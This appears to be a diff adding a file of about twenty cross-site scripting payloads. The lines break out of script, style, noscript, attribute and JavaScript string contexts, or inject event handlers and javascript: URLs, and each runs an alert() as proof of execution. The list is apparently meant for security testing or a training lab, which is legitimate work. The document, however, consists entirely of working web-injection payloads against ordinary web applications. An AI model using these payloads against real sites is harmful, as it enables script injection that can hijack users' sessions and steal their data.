@@ -1,0 +1,21 @@
+</script><script>alert('We triggered the XSS!');/*
+${alert('We triggered the XSS!')}
+alert('We triggered the XSS!')
+alert('We triggered the XSS!')
+"blue";}</style><script>alert('We triggered the XSS!')</script><style>
+1 onmouseover=alert('We triggered the XSS!')
+" onmouseover="alert('We triggered the XSS!')" alt="
+" onmouseover="alert('We triggered the XSS!')" alt="
+javascript:alert('We triggered the XSS!')
+<script>alert('XSS is successfully triggered!')</script>
+123);alert('XSS is successfully triggered!'
+onmouseover=alert('XSS is successfully triggered!') alt="1
+</noscript><script>alert('XSS is successfully triggered!')</script>
+javascript:alert('XSS is successfully triggered!')
+" onload="alert('XSS is successfully triggered!')" alt="
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
